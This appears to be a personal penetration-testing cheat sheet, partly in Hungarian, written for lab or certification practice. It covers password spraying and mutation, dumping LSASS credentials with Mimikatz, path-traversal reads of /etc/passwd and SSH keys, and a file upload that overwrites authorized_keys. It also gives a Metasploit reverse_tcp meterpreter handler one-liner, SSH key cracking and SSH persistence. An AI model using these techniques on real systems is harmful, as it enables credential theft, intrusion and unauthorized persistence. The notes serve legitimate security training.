# Random tricks
## Password Attacks
### Ha van valami service es nincs hozza cred.  
* Default credentials!
* Ha valami usernev van, akkor erdemes csak elkezdeni jelszot torni
  * talaltunk usernevet valahol
  * valami default usernevvel probalkozunk (ami service-specific)
  * tipik usernevvel probalkozunk (root linuxon es Administrator windowson)
* Keressuk aktivan a credeket hatha meglesznek
* Rabbit hole a service es nezzunk mast a gepen!!
### Password spraying always!!!
* Ha valahol talalunk egy jelszot, mindig csinaljunk password sparyinget es probaljuk meg a tobbi userrel is vagy random usernevekkel bruteforce-olni, hatha egy masiknak is az lesz a jelszava!
### Ha talalunk valahol egy random jelszot
* Password spraying!
  * Kiprobaljuk az osszes user-re akit felfedeztunk a rendszerben
  * Ha nincs userunk, akkor megprobaljuk bruteforce-olni oket valami lista alapjan a jelszoval
  * Root, Administrator usernevekkel probalkozunk
### Ha talalunk egy jelszo listat de egyik jelszo sem jo
* Password mutationt csapassunk, es el kell dontenunk, hogy mi legyen a rule
  * Van valami hint, hogy milyen jelszavak kellenek vagy hogy a user milyen jelszavakat hasznal
  * Megtalaljuk a jelszo policy-t, (vagy ha van registration form, akkor ott kikovetkeztetjuk)
  * Kitalalunk egyet mi magunktol
  * Vannak kesz beepitett rule-ok - Seclists-ben, illetve talan john es hashcat file-ok kozott is
  * Tipikus rule:
    * Ha kell nagybetu, akkor a legelso betu a nagy
      * A tobbi betu kis betu
    * Ha kell szam, akkor az a betu sor utan megy
    * Ha kell spec karakter, akkor az a legvegere megy (a szam utan)
    * Tipikus specialis karakterek, amiket hasznalni szoktak: ! @ # $ . , ? % _ -
      * Magyarban talan meg ezeket is szoktak: ' " + & *
      * Ezeket is de ritkabban: [ ] ( ) { } =
### User enum
* Ha van registration form vagy a login form verbose errort ad, akkor lehet user enumot csinalni!
  * Ami segit hogy userneveket talaljunk.
* Ha a password policy meg van akkor tudunk pontosabb jelszo fajlt vagy password mutation ruleokat ossze allitani
### Password mutations
* Ha meg van a password policy
  * Ragreppelhetunk a rock youra
  * Es kimasoljuk azokat amik kellenek belole.
* Vagy hashcat ruleokkal megoldjuk hogy minden egyes passwd-hez ami a rockyouban van rakjon hozza valamit.
  * Pl nagybetuvel kezdodjon. A vegen legyen evszam meg egy felkialtojel
  * Stb
* Crunch nevu tool-al lehet konnyen password mutationt csinalni
* Vagy siman lehet x hosszusagu teljesen random bruteforce is
  * De az nem tul hatekony.
### Dumping creds from LSASS with mimikatz
* LSASS is important for us because it caches NTLM hashes and other credentials, which we can extract using the sekurlsa Mimikatz module. We need to understand that **LSASS runs under the SYSTEM user and is therefore even more privileged than a process started as Administrator**.
* Due to this, **we can only extract passwords if we are running Mimikatz as Administrator (or higher) and have the SeDebugPrivilege access right enabled**. This access right grants us the ability to debug not only processes we own, but also all other usersâ€™ processes.
* **We can also elevate our privileges to the SYSTEM account with tools like PsExec or the built-in Mimikatz token elevation function to obtain the required privileges**. The token elevation function requires the SeImpersonatePrivilege access right to work, but all local administrators have it by default.
## LFI and dir traversal
### Ha fajlokat tudunk meghivni
* Probaljuk meg a ../../../../../../../../../../etc/passwd file-t kiolvasni
  * Abban ott vannak a usernevek!!!! Igy mar a user enum meg van a system userekre!
* /home/user1/.ssh/id_rsa Privat kulcsot olvassuk ki a megszerzett usernevvel ha tudjuk!!!
### Kulonbseg dir traversal es lfi kozott
* Van egy executable fajl. Ha ramegyunk:
  * Dir traversal eseten kiprintelodik a fajl forraskodja.
  * LFI eseten meg lefut a kod (es max a kod outputja printelodik).
## File Upload tricks
### explore files and web technologies
* When testing a file upload form, we should always determine what happens when a file is uploaded twice. If the web application indicates that the file already exists, we can use this method to brute force the contents of a web server. Alternatively, if the web application displays an error message, this may provide valuable information such as the programming language or web technologies in use.
### overwriting SSH keys
* try to overwrite the authorized_keys file
  * in the root folder or in the home folder of a specific user
* When using programming languages that include their own web server, administrators and developers often deploy the web application without any privilege structures by running applications as root or Administrator to avoid any permissions issues. This means we should always verify whether we can leverage root or administrator privileges in a file upload vulnerability.
* create ssh private and public keys on attack machine (with ssh-keygen command)
* copy public key to a file named 'authorized_keys'
* upload the authorized_keys file to the server like this:
  * ../../../../../../../root/.ssh/authorized_keys
  * ../../../../../../../home/user1/.ssh/authorized_keys
* try to login through SSH
## Windows version of linux 'www-data' user
Traditionally on Windows, the IIS web server runs as a **Network Service account, a passwordless built-in Windows identity with low privileges**. Starting with IIS version 7.5, Microsoft introduced the IIS Application Pool Identities.
## Msfconsole oneliner!!!!!
<pre>
kali@kali:~$ msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"
</pre>
## Evil-winrm '!' a jelszoban
* Ha a jelszoban '!' van akkkr agt escapelni kell backslash-el
* E.g.
  * -p "Password1\!"
## sql word wrap fix
* siman kimasolhatjuk a tobb sorra tordelt hosszu sql sorokat egybe a vagolapra
* es ha utana beillesztjuk notepad++-ba, vagy notepadba akkor ott nem lesz sortores, hanem szepen az osszes hosszu sor rendesen jelenik meg
* nem kell egyaltalan semmit sem alakitani rajtuk
## exit from telnet when stuck (like smtp)
<pre>
CTRL + ]
telnet> quit
$ (success)
</pre>
## CURL basic auth !!!!
<pre>
 curl -s -i http://10.10.10.3/ --basic -u user1:Password123
</pre>
## Burp too big payload
* use curl instead
* copy proper headers from burp
  * right click - copy as curl commmand
* merge with the basic curl file upload command
<pre>
# basic curl file upload command
 curl -s -i http://10.10.10.3/ -F "random1=@test_file.txt"
</pre>
## Burp Repeater insert binary data
* create a base64 representation of the binary data / binary file
* insert it into the burp repeater
* right click - convert selection - base64 - base64 decode
## print encoded forms of binary files (in copy-pastable form, not table format, column format)
<pre>
# base64 form (-w 0 means no line breaks)
cat file1 | base64 -w 0
# hex form (-c 1000000 means 1 million columns are used - technically it means no line breaks)
xxd -p -c 1000000 file1
</pre>
## Mit tudunk csinalni az SSH privat kulcsokkal?
* A. bejelentkezunk veluk ssh-n keresztul
<pre>
ssh -i id_rsa username@ip_addr
</pre>
* B. megprobaljuk feltorni !!!
  * es akkor megtalaljuk benne a jelszot!!!
### cracking found SSH private key
<pre>
sudo ssh2john.py id_rsa > hashes.txt
john hashes.txt -w=rockyou.txt
chmod 400 id_rsa
# utana bejelentkezhetunk es meg kell adni a feltort jelszot amikor keri
ssh -i id_rsa username@ip_addr
</pre>  
## ssh error
<pre>
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
Someone could be eavesdropping on you right now (man-in-the-middle attack)!
It is also possible that a host key has just been changed.
The fingerprint for the ED25519 key sent by the remote host is
SHA256:d0AdbkiUs3q7pFPUAUA7qPxc54l7ieTDllX2Kd4VaqM.
Please contact your system administrator.
Add correct host key in /home/osboxes/.ssh/known_hosts to get rid of this message.
Offending ED25519 key in /home/osboxes/.ssh/known_hosts:9
  remove with:
  ssh-keygen -f "/home/osboxes/.ssh/known_hosts" -R "10.10.1.49"
Host key for 10.10.1.49 has changed and you have requested strict checking.
Host key verification failed.
</pre>
* toroljuk ki vagy nevezzuk at a ~/.ssh/known_hosts file-t
  * es utana akkor jo lesz
## meterpreter and fully functional tty!!!!
* ne hasznaljuk a meterpreter> shell commandot !!!!!
* ha van egy normal shell akkor az egy session
* ha upgradelunk meterpreter-re, akkor az mar egy masodik session!!!
* csak siman fejlesszuk fel az elso session-t es ugraljunk a ket session kozott !!!!
## SSH connection through metasploit
* az ssh_login msf modul alapbol letrehoz egy ssh sessiont a hatterben!!!!!
* csak a username meg a jelszo kell neki, es utana atvaltunk a kesz session-re!!
* (dummy shell-t csinal)
* egybol lehet upgradelni meterpreter shell-re (sessions -u 1)
## FTP - view hidden files
* ftp> ls -la (igen, ls is mukodik, nem csak a dir...)
## "Permission denied" sorok elrejtese linux terminalon
* $ ... 2>/dev/null ...
  * stderr -t /dev/null-ra iranyitjuk
  * pl
    * $ find / -perm /4000
    * $ find / -perm /4000 2>/dev/null
## File-ok keresese access alapjan
* suid bites fajlok
  * $ find / -perm /4000 2>/dev/null
* mindenki altal irhato fajlok
  * $ find / -perm /222 2>/dev/null
## binary file analyzes
* file (file type by magic bytes)
* strings (strings, so references, etc...)
* ldd (linked libraries)
* ltrace (list library calls) (not always installed by default on linux)
* strace (list system calls) (tipically installed by default on linux)
* other usefull commands here
  * env (print environment variables)
  * export valami=value (set an environment variable)
## downloading files from victim machine to attack machine (when no meterpreter shell we have)
* we can do a python server on victim machine too!!!!!!!!!
* and if we download it from browser, we dont have to type the filenames!!!!
## Turn off dark mode of wireshark on kali linux
* $ qt5ct (megnyit egy ablakot, ott atallitjuk a rendszer stilust vilagosra)
* ha kesz vagyunk a wireshark-al utana meg siman visszaallitjuk
## too long file name
* we can user * like below
<pre>
 $ ls
 -rwxr-xr-x 1 root root 77 Nov 12  2020 log_2023_02_01_djfdhfusdhkfjsdhfkjsdhfjkdsfdhfhsdfd.txt
 $ cat log_2023*
 This is a fake log file ...
 $
</pre>
## tul kicsi a kepernyo es nem fer ki pl a ps aux kimenete
* vagy rendes shell-t csinalunk
* vagy kiirjuk fajl-ba es utana a fajlt olvassuk be
## linux persistence through SSH
* $ ssh-keygen -f user1 (generate ssh private and public key)
* $ cat id_rsa.pub >> authorized_keys (append user1 ssh public keys to authorized keys)
* (copy private key to attack machine)
* $ chmod 400 id_rsa (set proper privilege for SSH key) (it is needed to run ssh command)
* evil@attackmachine$ ssh -i id_rsa user1@10.10.10.3 (connect from attack machine through ssh)
### (optional) set local portforwarding through SSH
* ssh -L 1234:127.0.0.1:8080 user@victimmachine
## image steganography (extraction of hidden information from images)
### scanning images and extracting hidden info (with valid password)
* file image.jpg
* strings image.jpg
* steghide info image.jpg (ha ker passwordot is, akkor URES PASSWORD-del probaljuk meg majd!!!!!!)
  * amikor megkerdezi hogy akarunk e keresni benne elrejtett fajlot es ranyomunk hogy igen
  * utana kerni fog password-ot is
  * PROBALJUK MEG URES PASSWORD-del!!!!!!!
  * HA VAN BENNE VALAMI !!!
    * steghide extract -sf image.jpg (es ami benne van azt kipakolja majd)
* foremost -i image.jpg
* binwalk image.jpg
* binwalk -e image.jpg
### cracking (bruteforcing) password of image stego info
* stegcracker image1.jpg rockyou.txt
## reading, processing windows txt files from linux
* windows put \r\n at the end of lines 0x0d 0x0a
* linux only put \n at the end of lines 0x0a
* if we are processing win txt files in linux lines will be fucked because of the extra \r chars
* we need to convert it to unix format
  * dos2unix test file
* the file command output will be different
<pre>
$ file test_file.txt
test_file.txt: ASCII text, with CRLF line terminators
$ file test_file2.txt
test_file2.txt: ASCII text
</pre>
